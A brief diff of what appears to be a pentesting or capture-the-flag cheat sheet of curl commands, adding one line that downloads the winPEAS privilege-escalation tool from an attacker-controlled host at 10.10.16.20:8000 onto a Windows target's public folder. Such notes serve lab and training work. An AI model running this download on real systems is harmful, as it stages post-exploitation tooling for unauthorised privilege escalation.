@@ -51,3 +51,8 @@ curl -v 'url?arrayname[0]=value1&arrayname[1]=value2'
 ```
 curl -v $ip
 ```
+
+```
+curl 10.10.16.20:8000/winPEASany_ofs.exe -o C:/Users/Public/win.exe
+```
+
